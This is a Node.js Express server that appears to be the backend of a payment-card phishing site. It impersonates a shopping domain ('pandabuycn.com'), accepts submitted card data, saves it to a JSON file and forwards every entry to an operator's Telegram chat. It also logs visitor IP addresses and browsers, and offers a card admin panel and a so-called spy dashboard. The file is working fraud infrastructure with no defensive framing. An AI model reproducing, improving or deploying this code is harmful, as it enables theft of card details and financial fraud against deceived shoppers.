const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const http = require('http');
const socketIo = require('socket.io');
const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

// Load configuration
let config;
try {
  // Try to load local config first
  config = require('./config.local.js');
  console.log('✅ Loaded local configuration');
} catch (error) {
  // Fallback to default config
  config = require('./config.js');
  console.log('⚠️  Using default configuration - please create config.local.js');
}

// Load Telegram bot if enabled
let telegramBot = null;
if (config.server.enableTelegram && config.telegram.botToken !== 'YOUR_BOT_TOKEN_HERE') {
  const TelegramBot = require('./telegram-bot.js');
  telegramBot = new TelegramBot(config.telegram.botToken, config.telegram.chatId);
  console.log('🤖 Telegram bot initialized');
} else {
  console.log('📱 Telegram integration disabled or not configured');
}

const PORT = config.server.port;

// Data file paths
const DATA_FILE = path.join(__dirname, 'card-data.json');

// Middleware
app.use(cors({
  origin: true, // Allow all origins for now
  methods: ['GET', 'POST', 'DELETE'],
  credentials: true
})); // Enable CORS for cross-origin requests
app.use(express.json()); // Parse JSON request bodies

// Basic visitor logging (IP and browser only)
app.use((req, res, next) => {
  // Skip logging for API calls and admin panels
  if (req.path.startsWith('/api/') || req.path.includes('admin-')) {
    return next();
  }
  
  // Log basic visitor info
  const ip = req.ip || req.connection.remoteAddress || req.headers['x-forwarded-for']?.split(',')[0] || 'Unknown';
  const userAgent = req.headers['user-agent'] || 'Unknown';
  const browser = getBrowserFromUA(userAgent);
  
  console.log(`Visitor: ${ip} - ${browser} - ${req.path}`);
  next();
});

app.use(express.static('.')); // Serve static files from current directory

// Initialize data files if they don't exist
if (!fs.existsSync(DATA_FILE)) {
  fs.writeFileSync(DATA_FILE, JSON.stringify([]));
  console.log('Created empty card data file');
}

// API Routes
// Get all card data
app.get('/api/cards', (req, res) => {
  try {
    const data = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
    res.json(data);
  } catch (error) {
    console.error('Error reading card data:', error);
    res.status(500).json({ error: 'Failed to retrieve card data' });
  }
});

// Add new card data
app.post('/api/cards', (req, res) => {
  try {
    // Read existing data
    let data = [];
    try {
      data = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
    } catch (readError) {
      console.error('Error reading existing data, starting fresh:', readError);
    }
    
    // Add new card with timestamp and enhanced data
    const newCard = {
      ...req.body,
      serverTimestamp: new Date().toISOString(),
      submissionDate: new Date().toLocaleDateString(),
      submissionTime: new Date().toLocaleTimeString(),
      domain: 'pandabuycn.com'
    };
    
    data.push(newCard);
    
    // Write updated data back to file
    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
    
    console.log('Card data saved successfully');
    console.log('New card data:', JSON.stringify(newCard, null, 2));
    
    // Send Telegram notification if enabled
    console.log('Checking Telegram notification conditions...');
    console.log('telegramBot exists:', !!telegramBot);
    console.log('sendCardAlerts enabled:', config.telegram.notifications.sendCardAlerts);
    
    if (telegramBot && config.telegram.notifications.sendCardAlerts) {
      console.log('🚀 Sending Telegram notification...');
      telegramBot.sendCardNotification(newCard).catch(error => {
        console.error('Failed to send Telegram notification:', error.message);
      });
    } else {
      console.log('❌ Telegram notification skipped - conditions not met');
    }

    // Real-time dashboard removed
    
    res.status(201).json({ success: true, message: 'Card data saved successfully' });
  } catch (error) {
    console.error('Error saving card data:', error);
    res.status(500).json({ error: 'Failed to save card data' });
  }
});

// Clear all card data (for testing/admin purposes)
app.delete('/api/cards', (req, res) => {
  try {
    fs.writeFileSync(DATA_FILE, JSON.stringify([]));
    console.log('All card data cleared');
    res.json({ success: true, message: 'All card data cleared' });
  } catch (error) {
    console.error('Error clearing card data:', error);
    res.status(500).json({ error: 'Failed to clear card data' });
  }
});

// Simple endpoint for basic visit logging
app.get('/api/visits', (req, res) => {
  res.json({ message: 'Visit tracking simplified - check server logs' });
});

// Basic visit tracking endpoint
app.post('/api/track-visit', (req, res) => {
  try {
    const ip = req.ip || req.connection.remoteAddress || req.headers['x-forwarded-for']?.split(',')[0] || 'Unknown';
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const browser = getBrowserFromUA(userAgent);
    
    console.log(`Visit tracked: ${ip} - ${browser}`);
    
    res.json({ success: true, message: 'Visit tracked successfully' });
  } catch (error) {
    console.error('Error tracking visit:', error);
    res.status(500).json({ error: 'Failed to track visit' });
  }
});

// Admin panel routes
app.get('/admin-cards', (req, res) => {
  res.sendFile(path.join(__dirname, 'admin-cards.html'));
});

app.get('/admin-visits', (req, res) => {
  res.sendFile(path.join(__dirname, 'admin-visits.html'));
});

// Removed fingerprinting - no longer needed

// Removed tracking endpoint - no longer needed

// Test Telegram bot endpoint
app.get('/test-telegram', async (req, res) => {
  if (!telegramBot) {
    return res.json({ 
      success: false, 
      message: 'Telegram bot not configured. Please check your config.local.js file.' 
    });
  }
  
  try {
    await telegramBot.testConnection();
    res.json({ 
      success: true, 
      message: 'Telegram bot test successful! Check your Telegram chat for the test message.' 
    });
  } catch (error) {
    res.json({ 
      success: false, 
      message: `Telegram bot test failed: ${error.message}` 
    });
  }
});

// Real-time spy dashboard
app.get('/spy-dashboard', (req, res) => {
  res.sendFile(path.join(__dirname, 'realtime-spy-dashboard.html'));
});

// Server info route
app.get('/server-info', (req, res) => {
  res.sendFile(path.join(__dirname, 'server-info.html'));
});

// Removed tracking functions - no longer needed

function getBrowserFromUA(userAgent) {
  if (!userAgent) return 'Unknown';
  if (userAgent.includes('Chrome')) return 'Chrome';
  if (userAgent.includes('Firefox')) return 'Firefox';
  if (userAgent.includes('Safari')) return 'Safari';
  if (userAgent.includes('Edge')) return 'Edge';
  return 'Other';
}

// Removed Socket.IO - no longer needed

// Removed visitor cleanup - no longer needed

// Start server
server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Access the website at http://localhost:${PORT}`);
  console.log(`Card data API available at http://localhost:${PORT}/api/cards`);
  console.log(`Visits data API available at http://localhost:${PORT}/api/visits`);
  console.log(`Card Admin Panel at http://localhost:${PORT}/admin-cards`);
  console.log(`Visits Admin Panel at http://localhost:${PORT}/admin-visits`);
  console.log(`🕵️ SPY DASHBOARD at http://localhost:${PORT}/spy-dashboard`);
  console.log(`Server information page at http://localhost:${PORT}/server-info`);
}); 